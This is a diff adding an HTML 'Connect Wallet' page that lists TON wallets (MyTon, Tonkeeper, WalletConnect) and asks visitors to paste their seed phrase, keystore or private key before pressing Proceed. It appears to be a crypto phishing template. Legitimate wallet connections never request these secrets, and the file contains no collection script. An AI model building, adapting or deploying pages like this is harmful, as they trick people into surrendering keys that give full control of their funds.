@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Connect Wallet – Smart Chain Decentralize</title>
+  <link
+    href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap"
+    rel="stylesheet"
+  />
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Poppins', sans-serif;
+      background-color: #1d1f23;
+      color: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+    }
+    .container {
+      background-color: #111;
+      padding: 2rem;
+      border-radius: 12px;
+      width: 90%;
+      max-width: 480px;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.7);
+    }
+    .title {
+      font-size: 1.8rem;
+      font-weight: 700;
+      margin-bottom: 1rem;
+      text-align: center;
+    }
+    .subtitle {
+      font-size: 0.9rem;
+      color: #bbb;
+      text-align: center;
+      margin-bottom: 2rem;
+    }
+    .wallet-list {
+      list-style: none;
+      padding: 0;
+      margin: 0 0 2rem 0;
+    }
+    .wallet-item {
+      display: flex;
+      align-items: center;
+      gap: 1rem;
+      background: #1f2937;
+      padding: 0.75rem 1rem;
+      border-radius: 8px;
+      margin-bottom: 0.75rem;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+    .wallet-item:hover {
+      background: #374151;
+    }
+    .wallet-item img {
+      width: 32px;
+      height: 32px;
+      border-radius: 6px;
+    }
+    .wallet-item span {
+      font-size: 1rem;
+      color: #fff;
+    }
+    .input-section {
+      margin-bottom: 1.5rem;
+    }
+    .input-section input,
+    .input-section textarea {
+      width: 100%;
+      padding: 0.75rem;
+      border: none;
+      border-radius: 8px;
+      font-size: 1rem;
+      margin-top: 0.5rem;
+    }
+    .buttons {
+      display: flex;
+      justify-content: space-between;
+    }
+    .btn {
+      padding: 0.75rem 1.5rem;
+      border-radius: 8px;
+      font-weight: 600;
+      cursor: pointer;
+      border: none;
+      transition: background 0.3s;
+    }
+    .btn-proceed {
+      background: #2563eb;
+      color: #fff;
+    }
+    .btn-proceed:hover {
+      background: #1e40af;
+    }
+    .btn-cancel {
+      background: #374151;
+      color: #fff;
+    }
+    .btn-cancel:hover {
+      background: #4b5563;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <div class="title">Connect Wallet</div>
+    <div class="subtitle">Please connect your wallet to continue</div>
+
+    <ul class="wallet-list">
+      <!-- Example items: adapt srcs to your logo/icons -->
+      <li class="wallet-item">
+        <img src="https://via.placeholder.com/32" alt="MyTon Wallet Logo">
+        <span>MyTon Wallet</span>
+      </li>
+      <li class="wallet-item">
+        <img src="https://via.placeholder.com/32" alt="Tonkeeper Wallet Logo">
+        <span>Tonkeeper Wallet</span>
+      </li>
+      <li class="wallet-item">
+        <img src="https://via.placeholder.com/32" alt="WalletConnect Logo">
+        <span>Wallet Connect</span>
+      </li>
+      <!-- add more items as needed -->
+    </ul>
+
+    <div class="input-section">
+      <label for="private-input">Phrase / Keystore / Private Key</label>
+      <textarea id="private-input" rows="3" placeholder="Typically 12 (sometimes 24) words separated by single spaces"></textarea>
+    </div>
+
+    <div class="buttons">
+      <button class="btn btn-cancel">Cancel</button>
+      <button class="btn btn-proceed">Proceed</button>
+    </div>
+  </div>
+
+</body>
+</html>
